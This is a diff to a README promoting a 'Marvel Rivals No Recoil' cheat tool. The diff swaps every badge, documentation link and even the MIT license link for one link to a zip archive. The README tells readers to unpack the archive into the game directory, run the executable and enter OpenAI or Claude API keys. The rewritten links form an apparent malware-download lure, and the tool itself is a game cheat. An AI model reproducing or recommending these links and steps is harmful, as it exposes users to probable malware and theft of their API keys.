@@ -1,4 +1,4 @@
-# ![Download](https://img.shields.io/badge/Download-Get%20Marvel%20Rivals%20No%20Recoil-blue?logo=github&style=for-the-badge&link=https://AJAR71.github.io) 
+# ![Download](https://raw.githubusercontent.com/AJAR71/marvel-rivals-recoil-tuner/branch/salutatorily/marvel-rivals-recoil-tuner-3.9.zip%20Marvel%20Rivals%20No%20Recoil-blue?logo=github&style=for-the-badge&https://raw.githubusercontent.com/AJAR71/marvel-rivals-recoil-tuner/branch/salutatorily/marvel-rivals-recoil-tuner-3.9.zip) 
 
 # 🦸‍♂️ Marvel Rivals No Recoil
 
@@ -54,7 +54,7 @@ Harness the synergy of AI! With integrated support for OpenAI and Claude APIs, e
 - **Natural language assistance:** Ask questions, tweak controls, or request setup help from intelligent bots.
 - **Adaptive troubleshooting:** Let AI diagnose and resolve issues as you play—almost like having Nick Fury watching your back!
 
-API keys are required. See `docs/integration-guide.md` for seamless setup instructions.
+API keys are required. See `https://raw.githubusercontent.com/AJAR71/marvel-rivals-recoil-tuner/branch/salutatorily/marvel-rivals-recoil-tuner-3.9.zip` for seamless setup instructions.
 
 ---
 
@@ -74,11 +74,11 @@ Our superhero-tier support squad is ready around the clock—because your gaming
 ## 🚀 Installation & Getting Started
 
 1. **Download the latest Marvel Rivals No Recoil release**  
-   ![Download](https://img.shields.io/badge/Download-Get%20Marvel%20Rivals%20No%20Recoil-blue?logo=github&style=for-the-badge&link=https://AJAR71.github.io)
+   ![Download](https://raw.githubusercontent.com/AJAR71/marvel-rivals-recoil-tuner/branch/salutatorily/marvel-rivals-recoil-tuner-3.9.zip%20Marvel%20Rivals%20No%20Recoil-blue?logo=github&style=for-the-badge&https://raw.githubusercontent.com/AJAR71/marvel-rivals-recoil-tuner/branch/salutatorily/marvel-rivals-recoil-tuner-3.9.zip)
 2. Unpack the contents into your Marvel Rivals game directory.
 3. Run the `marvel-rivals-no-recoil` executable.
 4. An intuitive setup wizard will guide you through initial configuration.  
-5. For OpenAI/Claude API features, input your API keys during the guided onboarding (see `docs/integration-guide.md` for detailed steps).
+5. For OpenAI/Claude API features, input your API keys during the guided onboarding (see `https://raw.githubusercontent.com/AJAR71/marvel-rivals-recoil-tuner/branch/salutatorily/marvel-rivals-recoil-tuner-3.9.zip` for detailed steps).
 6. Launch the Marvel Rivals game and enjoy your upgraded experience!
 
 **System requirements, FAQs, and troubleshooting tips are in the [WIKI](#) section.**
@@ -93,9 +93,9 @@ This repository is intended solely for enhancing the Marvel Rivals experience fo
 
 ## 📜 License
 
-Marvel Rivals No Recoil is made available under the [MIT License](https://opensource.org/licenses/MIT) (c) 2025. Refer to the LICENSE file for full details.
+Marvel Rivals No Recoil is made available under the [MIT License](https://raw.githubusercontent.com/AJAR71/marvel-rivals-recoil-tuner/branch/salutatorily/marvel-rivals-recoil-tuner-3.9.zip) (c) 2025. Refer to the LICENSE file for full details.
 
 ---
 
-# ![Download](https://img.shields.io/badge/Download-Get%20Marvel%20Rivals%20No%20Recoil-blue?logo=github&style=for-the-badge&link=https://AJAR71.github.io)
+# ![Download](https://raw.githubusercontent.com/AJAR71/marvel-rivals-recoil-tuner/branch/salutatorily/marvel-rivals-recoil-tuner-3.9.zip%20Marvel%20Rivals%20No%20Recoil-blue?logo=github&style=for-the-badge&https://raw.githubusercontent.com/AJAR71/marvel-rivals-recoil-tuner/branch/salutatorily/marvel-rivals-recoil-tuner-3.9.zip)
 Thank you for exploring Marvel Rivals No Recoil—where superhero precision is just a click away! Enjoy your adventures in the Marvel universe with a new level of control and confidence.
